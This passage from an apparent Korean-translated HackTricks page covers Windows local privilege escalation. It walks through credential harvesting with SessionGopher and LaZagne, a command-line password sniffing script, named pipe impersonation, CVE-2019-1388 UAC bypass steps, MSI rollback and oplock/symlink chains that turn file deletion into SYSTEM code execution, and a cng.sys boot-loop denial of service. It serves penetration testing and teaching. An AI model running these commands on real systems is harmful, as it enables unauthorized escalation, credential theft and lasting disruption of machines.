[**Lazagne**](https://github.com/AlessandroZ/LaZagne)는 시스템에서 password를 추출하는 또 다른 훌륭한 도구입니다.

도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)는 이 데이터를 clear text로 저장하는 여러 툴의 **sessions**, **usernames** and **passwords**를 검색합니다 (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

다음과 같은 상황을 가정해보자: **SYSTEM으로 실행되는 프로세스가 새로운 프로세스를 엽니다** (`OpenProcess()`) — 이때 **full access** 권한으로 엽니다. 동일한 프로세스가 **또 다른 프로세스를 생성합니다** (`CreateProcess()`) — **권한은 낮지만 메인 프로세스의 모든 열린 핸들을 상속하는** 상태입니다.\
그런 다음, 만약 낮은 권한 프로세스에 대해 **full access** 권한을 가지고 있다면, `OpenProcess()`로 생성된 권한 있는 프로세스에 대한 **열린 핸들**을 획득하고 **shellcode**를 주입할 수 있습니다.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

공유 메모리 세그먼트, 일반적으로 **pipes** 라고 불리는 것은 프로세스 간 통신과 데이터 전송을 가능하게 합니다.

Windows는 **Named Pipes**라는 기능을 제공하며, 관련이 없는 프로세스들 간에도, 심지어 다른 네트워크에 걸쳐서도 데이터를 공유할 수 있게 합니다. 이는 **named pipe server**와 **named pipe client**로 역할이 정의되는 클라이언트/서버 아키텍처와 유사합니다.

클라이언트가 파이프를 통해 데이터를 보낼 때, 그 파이프를 설정한 **서버**는 필요한 **SeImpersonate** 권한을 가지고 있다면 해당 **클라이언트의 신원으로 위임(impersonate)** 할 수 있습니다. 파이프를 통해 통신하는 **권한 있는 프로세스**를 식별하고 해당 프로세스가 당신이 만든 파이프와 상호작용할 때 그 신원을 모방하면 더 높은 권한을 얻을 기회를 만들 수 있습니다. 이러한 공격을 수행하는 방법에 대한 지침은 [**here**](named-pipe-client-impersonation.md) 와 [**here**](#from-high-integrity-to-system) 에서 찾을 수 있습니다.

또한 다음 도구는 burp 같은 도구로 named pipe 통신을 가로채는 것을 허용합니다: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 모든 파이프를 나열하고 찾아서 privescs를 찾는 데 도움이 됩니다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony 서비스(TapiSrv)가 server 모드일 때 `\\pipe\\tapsrv` (MS-TRP)를 노출합니다. 원격 인증된 클라이언트는 mailslot 기반의 비동기 이벤트 경로를 악용하여 `ClientAttach`를 `NETWORK SERVICE`가 쓰기 가능한 기존 파일의 임의의 **4-byte write**로 전환할 수 있고, 이후 Telephony 관리자 권한을 얻어 서비스로서 임의의 DLL을 로드할 수 있습니다. 전체 흐름:

- `ClientAttach`에서 `pszDomainUser`를 쓰기 가능한 기존 경로로 설정 → 서비스가 `CreateFileW(..., OPEN_EXISTING)`로 파일을 열고 비동기 이벤트 기록에 사용합니다.
- 각 이벤트는 `Initialize`의 공격자가 제어하는 `InitContext`를 해당 핸들에 씁니다. `LRegisterRequestRecipient` (`Req_Func 61`)로 라인 앱을 등록하고, `TRequestMakeCall` (`Req_Func 121`)을 트리거한 뒤, `GetAsyncEvents` (`Req_Func 0`)로 가져오고, 그런 다음 unregister/shutdown 하여 결정적(deterministic)인 쓰기를 반복합니다.
- `C:\Windows\TAPI\tsec.ini`의 `[TapiAdministrators]`에 자신을 추가하고 다시 연결한 다음, 임의의 DLL 경로로 `GetUIDllName`을 호출하여 `NETWORK SERVICE`로서 `TSPI_providerUIIdentify`를 실행합니다.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## 기타

### File Extensions that could execute stuff in Windows

페이지를 확인하세요: **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

사용자 권한 쉘을 얻었을 때, 스케줄된 작업이나 다른 프로세스들이 명령줄에 자격증명을 전달하면서 실행될 수 있습니다. 아래 스크립트는 2초마다 프로세스의 명령줄을 캡처하고 현재 상태를 이전 상태와 비교하여 변경 사항을 출력합니다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 프로세스에서 암호 탈취

## Low Priv User에서 NT\AUTHORITY SYSTEM으로 권한 상승 (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스(콘솔 또는 RDP를 통해)에 접근할 수 있고 UAC가 활성화되어 있는 경우, 일부 Microsoft Windows 버전에서는 비특권 사용자로부터 터미널이나 "NT\AUTHORITY SYSTEM"과 같은 다른 프로세스를 실행할 수 있습니다.

이로 인해 동일한 취약점을 이용해 권한을 상승시키고 UAC를 동시에 우회할 수 있습니다. 또한 아무것도 설치할 필요가 없고, 과정에서 사용되는 바이너리는 Microsoft에서 서명하고 발행한 것입니다.

영향을 받는 시스템 일부는 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 악용하려면 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

공격은 기본적으로 Windows Installer의 rollback 기능을 악용하여 정당한 파일을 제거(언인스톨) 과정에서 악성 파일로 교체하는 방식입니다. 이를 위해 공격자는 `C:\Config.Msi` 폴더를 하이재킹하는 데 사용할 **malicious MSI installer**를 생성해야 하며, 해당 폴더는 다른 MSI 패키지의 언인스톨 시 rollback 파일을 저장하는 데 Windows Installer가 사용하게 됩니다. 이 rollback 파일들을 변경하여 악성 페이로드가 포함되도록 만듭니다.

요약된 기법은 다음과 같습니다:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 스트림은 폴더의 **인덱스 메타데이터**를 저장합니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` 스트림을 삭제하면**, NTFS는 파일시스템에서 폴더를 **통째로 제거합니다**.

다음과 같은 표준 파일 삭제 APIs를 사용하여 이 작업을 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *파일* 삭제 API를 호출하고 있음에도 불구하고, **폴더 자체를 삭제한다**.

### 폴더 내용 삭제에서 SYSTEM EoP로
만약 당신의 primitive가 임의의 파일/폴더를 삭제할 수 없지만, **공격자가 제어하는 폴더의 *내용물*을 삭제할 수 있다**면 어떻게 될까?

1. Step 1: 미끼 폴더와 파일 설정
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt`에 **oplock**을 설정
- **oplock**은 권한이 높은 프로세스가 `file1.txt`를 삭제하려 할 때 실행을 **일시중지**시킨다.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 3단계: SYSTEM 프로세스 트리거 (예: `SilentCleanup`)
- 이 프로세스는 폴더(예: `%TEMP%`)를 스캔하고 해당 내용물을 삭제하려고 시도합니다.
- `file1.txt`에 도달하면 **oplock triggers**가 발생하여 제어를 당신의 callback에 넘깁니다.

4. 4단계: oplock callback 내부 – 삭제 리디렉션

- 옵션 A: `file1.txt`를 다른 곳으로 이동
- 이렇게 하면 `folder1`를 비우면서 oplock을 유지합니다.
- `file1.txt`를 직접 삭제하지 마세요 — 그러면 oplock이 조기에 해제됩니다.

- 옵션 B: `folder1`를 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 옵션 C: `\RPC Control`에 **symlink** 생성:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 이것은 폴더 메타데이터를 저장하는 NTFS 내부 스트림을 표적으로 삼습니다 — 이를 삭제하면 폴더가 삭제됩니다.

5. 5단계: oplock 해제
- SYSTEM 프로세스가 계속 진행되어 `file1.txt`를 삭제하려고 시도합니다.
- 하지만 이제 junction + symlink 때문에 실제로 삭제되는 것은:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`가 SYSTEM에 의해 삭제됩니다.

### 임의 폴더 생성에서 영구 DoS로

**SYSTEM/admin 권한으로 임의의 폴더를 생성할 수 있는 primitive를 악용하세요** — 심지어 **파일을 쓸 수 없거나** 또는 **약한 권한을 설정할 수 없더라도**.

**폴더**(파일이 아님)를 **중요한 Windows 드라이버**의 이름으로 생성하세요. 예:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 일반적으로 `cng.sys` 커널 모드 드라이버에 해당합니다.
- 만약 당신이 이 경로를 **폴더로 미리 생성(pre-create it as a folder)** 해두면, Windows는 부팅 시 실제 드라이버를 로드하지 못합니다.
- 그러면 Windows는 부팅 중에 `cng.sys`를 로드하려고 시도합니다.
- 폴더를 발견하고, **실제 드라이버를 확인하지 못해(fails to resolve the actual driver)**, **충돌하거나 부팅이 중단(crashes or halts boot)** 됩니다.
- 대체 수단이 **없으며(no fallback)**, 외부 개입(예: 부팅 복구 또는 디스크 접근) 없이는 **복구 불가(no recovery)** 합니다.

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

권한 있는 서비스가 **쓰기 가능한 config**에서 읽은 경로에 로그/내보내기를 작성할 때, 해당 경로를 **Object Manager symlinks + NTFS mount points**로 리다이렉트하면 권한 있는 쓰기를 임의 덮어쓰기로 전환할 수 있습니다(심지어 **without SeCreateSymbolicLinkPrivilege**).

**Requirements**
- 대상 경로를 저장하는 Config에 공격자가 쓸 수 있어야 함(예: `%ProgramData%\...\.ini`).
- `\RPC Control`에 마운트 포인트를 생성하고 OM 파일 심볼릭링크를 만들 수 있는 능력(James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- 해당 경로에 쓰는 권한 있는 작업(로그, 내보내기, 보고).

**Example chain**
1. config을 읽어 권한 있는 로그 대상 복구, 예: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`가 `C:\ProgramData\ICONICS\IcoSetup64.ini`에 있음.
2. 관리자 권한 없이 해당 경로를 리다이렉트:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 권한 있는 컴포넌트가 로그를 쓰도록 기다립니다(예: admin이 "send test SMS"를 트리거). 이제 쓰기는 `C:\Windows\System32\cng.sys`에 기록됩니다.
4. 덮어쓴 대상(hex/PE parser)을 검사해 손상 여부를 확인합니다; 재부팅하면 Windows가 변조된 드라이버 경로를 로드하게 되어 → **boot loop DoS**가 발생합니다. 이 방법은 권한 있는 서비스가 쓰기 위해 열 파일에도 일반화됩니다.

> `cng.sys`는 보통 `C:\Windows\System32\drivers\cng.sys`에서 로드되지만, `C:\Windows\System32\cng.sys`에 복사본이 있으면 먼저 시도될 수 있어 손상된 데이터에 대해 신뢰할 수 있는 DoS 싱크가 됩니다.



## **High Integrity에서 System으로**

### **새 서비스**

이미 High Integrity 프로세스에서 실행 중이라면, **path to SYSTEM**은 단지 새로운 서비스를 **생성하고 실행하는 것**만으로 쉽게 달성할 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary를 만들 때, 그것이 유효한 service인지 또는 바이너리가 필요한 작업을 빠르게 수행하는지 확인하세요. 유효한 service가 아니면 20s 내에 종료됩니다.

### AlwaysInstallElevated

High Integrity 프로세스에서 AlwaysInstallElevated 레지스트리 항목을 활성화하고 _.msi_ 래퍼를 사용해 reverse shell을 **설치**해 볼 수 있습니다.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**다음에서 코드를 확인할 수 있습니다:** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

해당 token 권한이 있다면(대개 이미 High Integrity 프로세스에서 발견됩니다) SeDebug 권한으로 거의 모든 프로세스(프로tected되지 않은 프로세스)를 **열고**, 그 프로세스의 **토큰을 복사**하여 해당 토큰으로 **임의의 프로세스를 생성**할 수 있습니다.\
이 기법은 보통 **모든 token 권한을 가진 SYSTEM으로 실행 중인 프로세스**를 선택해 사용합니다 (_네, 모든 token 권한이 없는 SYSTEM 프로세스도 찾을 수 있습니다_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 기법은 meterpreter가 `getsystem`에서 사용하는 방식입니다. 이 기법은 **파이프를 생성한 다음 해당 파이프에 쓰도록 service를 생성/남용하는 것**으로 구성됩니다. 그런 다음 **SeImpersonate** 권한을 사용해 파이프를 생성한 **서버**는 파이프 클라이언트(서비스)의 **토큰을 가장(impersonate)** 할 수 있어 SYSTEM 권한을 얻습니다.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

만약 SYSTEM으로 실행되는 **프로세스가 로드하는 dll**을 **hijack**할 수 있다면 해당 권한으로 임의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이런 종류의 권한 상승에 유용하며, 특히 high integrity 프로세스에서는 dll을 로드하는 폴더에 **쓰기 권한**이 있어 훨씬 **더 쉽게 달성**할 수 있습니다.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations 및 민감한 파일을 검사합니다 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). 감지됨.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 misconfigurations를 점검하고 정보를 수집합니다 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations 검사**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP의 저장된 세션 정보를 추출합니다. 로컬에서 -Thorough 사용.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 자격 증명을 추출합니다. 감지됨.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 비밀번호를 도메인 전반에 스프레이합니다**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ADIDNS/LLMNR/mDNS 스푸퍼 및 MITM 도구입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본적인 Windows 권한 상승용 열거**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 알려진 privesc 취약점을 검색합니다 (Watson으로 대체되어 DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(관리자 권한 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc 취약점을 검색합니다 (VisualStudio로 컴파일해야 함) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 호스트를 열거하여 misconfigurations를 찾습니다 (privesc라기보다 정보 수집 도구) (컴파일 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 많은 소프트웨어에서 자격 증명을 추출합니다 (GitHub에 precompiled exe 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration 검사 (GitHub에 사전컴파일된 실행파일). 권장하지 않음. Win10에서 잘 동작하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 misconfigurations 검사 (python으로 만든 exe). 권장하지 않음. Win10에서 잘 동작하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 게시물을 기반으로 만든 도구(접근권한확인 accesschk 없이도 제대로 작동하지만 사용할 수 있음).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** 출력물을 읽고 작동 가능한 익스플로잇을 추천합니다 (로컬 python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** 출력물을 읽고 작동 가능한 익스플로잇을 추천합니다 (로컬 python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

프로젝트를 올바른 버전의 .NET으로 컴파일해야 합니다 ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). 피해자 호스트에 설치된 .NET 버전을 확인하려면 다음을 실행할 수 있습니다:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
